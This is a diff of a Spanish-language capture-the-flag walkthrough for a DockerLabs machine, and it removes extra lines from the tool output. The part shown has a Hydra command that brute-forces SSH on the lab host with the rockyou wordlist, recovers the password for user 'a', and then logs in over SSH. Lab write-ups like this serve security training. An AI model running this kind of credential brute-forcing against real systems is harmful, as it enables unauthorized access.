@@ -73,18 +73,11 @@ Por ello, lo siguiente es ver si `a` se trata de un usuario o una contraseña de
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
 └─$ hydra -l a -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -t 64 -I
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 22:53:46
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
 [22][ssh] host: 172.17.0.2   login: a   password: secret
 1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 23 final worker threads did not complete until end.
-[ERROR] 23 targets did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-27 22:53:51
 ```
 
 Nos conectamos con las credenciales obtenidas:
@@ -92,20 +85,7 @@ Nos conectamos con las credenciales obtenidas:
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
 └─$ ssh a@172.17.0.2                                                     
-The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
-ED25519 key fingerprint is SHA256:k21i9gNka9bAHgFRx7TjoBoqirDbAkhw/dp9dfTXRRs.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
 a@172.17.0.2's password: 
-Linux 94ac483a3277 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
 a@94ac483a3277:~$ whoami
 a
 ```
